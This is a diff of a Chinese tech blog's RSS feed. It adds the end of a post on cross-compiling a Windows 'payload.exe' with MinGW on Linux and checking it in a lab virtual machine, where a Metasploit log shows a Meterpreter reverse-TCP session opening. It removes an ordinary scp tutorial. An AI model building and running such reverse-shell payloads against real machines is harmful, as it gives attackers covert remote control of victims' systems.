+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/collect2 -plugin /usr/lib/gcc/i686-w64-mingw32/10.2.0/liblto_plugin.so -plugin-opt=/usr/lib/gcc/i686-w64-mingw32/10.2.0/lto-wrapper -plugin-opt=-fresolution=/tmp/cch6fKzn.res -plugin-opt=-pass-through=-lmingw32 -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lmoldname -plugin-opt=-pass-through=-lmingwex -plugin-opt=-pass-through=-lmsvcrt -plugin-opt=-pass-through=-lpthread -plugin-opt=-pass-through=-ladvapi32 -plugin-opt=-pass-through=-lshell32 -plugin-opt=-pass-through=-luser32 -plugin-opt=-pass-through=-lkernel32 -plugin-opt=-pass-through=-lmingw32 -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lmoldname -plugin-opt=-pass-through=-lmingwex -plugin-opt=-pass-through=-lmsvcrt -m i386pe -Bdynamic -o payload.exe /usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/../lib/crt2.o /usr/lib/gcc/i686-w64-mingw32/10.2.0/crtbegin.o -L/usr/lib/gcc/i686-w64-mingw32/10.2.0 -L/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/../lib -L/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib /tmp/ccvhBE4k.o -lmingw32 -lgcc -lgcc_eh -lmoldname -lmingwex -lmsvcrt -lpthread -ladvapi32 -lshell32 -luser32 -lkernel32 -lmingw32 -lgcc -lgcc_eh -lmoldname -lmingwex -lmsvcrt /usr/lib/gcc/i686-w64-mingw32/10.2.0/crtend.o
+COLLECT_GCC_OPTIONS=&amp;#39;-o&amp;#39; &amp;#39;payload.exe&amp;#39; &amp;#39;-v&amp;#39; &amp;#39;-mtune=generic&amp;#39; &amp;#39;-march=pentiumpro&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;没有任何报错之后，丢进虚拟机里运行, 如果 meterpreter 能够上线则说明编译是有效的&lt;/p&gt;
+&lt;h2 id=&#34;检验&#34;&gt;检验&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-05-07-18-18-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;[*] Started reverse TCP handler on 192.168.0.112:3333 
+[*] Sending stage (175174 bytes) to 192.168.0.113
+[*] Meterpreter session 1 opened (192.168.0.112:3333 -&amp;gt; 192.168.0.113:1045) at 2021-05-07 18:18:17 +0800
+
+meterpreter &amp;gt; sysinfo
+Computer        : CHINA-74ED62096
+OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : zh_CN
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们直接丢进去跑&amp;hellip;&lt;/p&gt;
+&lt;p&gt;emmm 虽然字乱码了。&lt;/p&gt;
+&lt;p&gt;不过连接是建立了，那么说明编译是有效的～&lt;/p&gt;
+- https://weepingdogel.github.io/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/ - 2019-2021 | WeepingDogel via CC-BY-NC 4.0</description>
+        </item>
     
     
     
@@ -1625,82 +1788,6 @@ sign()
     fileread(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;test.txt&amp;#34;&lt;/span&gt;)
     filedel(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;test.txt&amp;#34;&lt;/span&gt;)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;- https://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/ - 2019-2021 | WeepingDogel via CC-BY-NC 4.0</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>scp 命令小结</title>
-        <link>https://weepingdogel.github.io/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/</link>
-        <pubDate>Sat, 05 Sep 2020 12:10:07 +0800</pubDate>
-        
-        <guid>https://weepingdogel.github.io/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/</guid>
-        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/ -&lt;h2 id=&#34;scp-命令是什么&#34;&gt;scp 命令是什么&lt;/h2&gt;
-&lt;p&gt;是传文件用的..&lt;/p&gt;
-&lt;p&gt;我们用 &lt;code&gt;ssh&lt;/code&gt; 操作服务器，当我们需要给服务器传输文件的时候，&lt;code&gt;scp&lt;/code&gt; 命令会通过 &lt;code&gt;ssh&lt;/code&gt; 的端口进行文件传输。&lt;/p&gt;
-&lt;h2 id=&#34;用法&#34;&gt;用法&lt;/h2&gt;
-&lt;p&gt;当我们在终端输入 &lt;code&gt;scp&lt;/code&gt; 后，我们会得到这些&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; scp
-usage: scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
-            [-J destination] [-l limit] [-o ssh_option] [-P port]
-            [-S program] source ... target
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很显然我们很快就知道了一些参数&amp;hellip;&lt;/p&gt;
-&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
-&lt;p&gt;这里举一些例子，来展示清楚具体的使用方法&amp;hellip;&lt;/p&gt;
-&lt;p&gt;先说明一下我的测试环境&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Arch Linux&lt;/p&gt;
-&lt;p&gt;IP: 192.168.0.105&lt;/p&gt;
-&lt;p&gt;CentOS8 虚拟机&lt;/p&gt;
-&lt;p&gt;IP: 192.168.0.108&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;上传一个文件&#34;&gt;上传一个文件&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ scp [本地文件名] 用户名@地址:[文件名]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是一般用法，但是&lt;strong&gt;请确保路径正确！&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;即：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~ [1]&amp;gt; scp ./编译/7.1.0.zip root@192.168.0.108:/root/
-root@192.168.0.108&amp;#39;s password: 
-7.1.0.zip                                                    100%   95KB   5.2MB/s   00:00 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个很简单的，没什么多说的了..&lt;/p&gt;
-&lt;h3 id=&#34;下载一个文件&#34;&gt;下载一个文件&lt;/h3&gt;
-&lt;p&gt;如果我们要从服务器里取一个文件下来修改，而服务器没有 &lt;code&gt;ftp&lt;/code&gt; 时该怎么办呢？&lt;/p&gt;
-&lt;p&gt;我们需要用 SSH 去找到这个文件的位置，不过这个就不详写了，与主题无关。（总之你知道文件的位置就可以了）&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ scp 用户名@地址:[文件名] [本地文件名]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是要提醒一下，这个&lt;strong&gt;文件名&lt;/strong&gt;， &lt;strong&gt;是一个路径！&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;是一个&lt;strong&gt;相对路径&lt;/strong&gt;或&lt;strong&gt;绝对路径&lt;/strong&gt;！具体依情况而定，但&lt;strong&gt;它一定是个路径！&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;如：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; scp root@192.168.0.108:/root/index.html /tmp/index.html
-root@192.168.0.108&amp;#39;s password: 
-index.html                                                   100%   46KB 728.6KB/s   00:00
-weepingdogel@WeepingDogel ~&amp;gt; ls /tmp/*.html -lh
--rw-r--r-- 1 weepingdogel weepingdogel 47K  9月  5 20:54 /tmp/index.html
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只需要知道文件在服务器的具体位置以及想好保存到本地的一个位置就可以了&lt;/p&gt;
-&lt;h3 id=&#34;指定一个-ip&#34;&gt;指定一个 IP&lt;/h3&gt;
-&lt;p&gt;一般情况下 SSH 的端口都是 22，那是真的云服务器或者一些有公网 IP 的服务器。&lt;/p&gt;
-&lt;p&gt;而上文写的是基于局域网中的文件传输，我们需要内网穿透才能远程文件传输，但内网穿透在一般情况下都是指定一个别的端口来给 SSH 建立一个通道，因此端口就不再是 22 了。&lt;/p&gt;
-&lt;p&gt;我这里用的是 &lt;a href=&#34;https://www.natfrp.com/&#34;&gt;SakuraFRP&lt;/a&gt; ，非常好用的免费内网穿透服务！&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;上传：&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;scp -P [端口]  [本地文件名] 用户名@地址:[文件名]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;下载：&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;scp -P [端口] 用户名@地址:[文件名] [本地文件名]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面已经提示过很多次&lt;strong&gt;这个&lt;code&gt;[文件名]&lt;/code&gt;是个路径了&lt;/strong&gt;。这里就不再多废话啦。&lt;/p&gt;
-&lt;p&gt;嗯&amp;hellip; 具体就是这样子的：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是这里我来个组合命令&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~ [1]&amp;gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py &amp;amp;&amp;amp; cd /tmp &amp;amp;&amp;amp; python test.py
-The authenticity of host &amp;#39;[cn-zj-dx-2.sakurafrp.com]:45820 ([222.186.174.33]:45820)&amp;#39; can&amp;#39;t be established.
-ECDSA key fingerprint is SHA256:8J1Z+I8NtPXAk7EFDwLiwu8pmwSoPLYeJM2iYnV7z5M.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &amp;#39;[cn-zj-dx-2.sakurafrp.com]:45820,[222.186.174.33]:45820&amp;#39; (ECDSA) to the list of known hosts.
-root@cn-zj-dx-2.sakurafrp.com&amp;#39;s password: 
-test.py                                                      100%   21     0.2KB/s   00:00    
-Hello World
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上传的也是差不多的啦，把位置反过来就可以了，这里就不多演示啦&lt;/p&gt;
-&lt;p&gt;写完啦！&lt;/p&gt;
-&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
-&lt;p&gt;啥？这次没有，自己试出来的&amp;hellip;&lt;/p&gt;
-&lt;p&gt;唔啊！准确来说也有，那就是各种搜索引擎啦～&lt;/p&gt;
-- https://weepingdogel.github.io/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/ - 2019-2021 | WeepingDogel via CC-BY-NC 4.0</description>
         </item>
     
     
